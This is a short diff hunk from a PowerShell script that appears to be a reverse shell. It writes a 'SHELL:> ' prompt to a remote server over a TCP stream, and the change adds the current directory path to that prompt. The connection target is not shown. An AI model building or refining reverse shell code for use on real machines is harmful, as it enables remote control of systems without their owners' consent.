@@ -12,7 +12,7 @@ $NetworkStream = $TCPClient.GetStream()
 $streamWriter = New-Object System.IO.StreamWriter($NetworkStream)
 function writeStreamToServer($string){
     [byte[]]$script:buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
-    $streamWriter.Write($string + 'SHELL:> ')
+    $streamWriter.Write($string + 'SHELL '+(Get-Location).Path+' :> ')
     $streamWriter.Flush()
 }
 
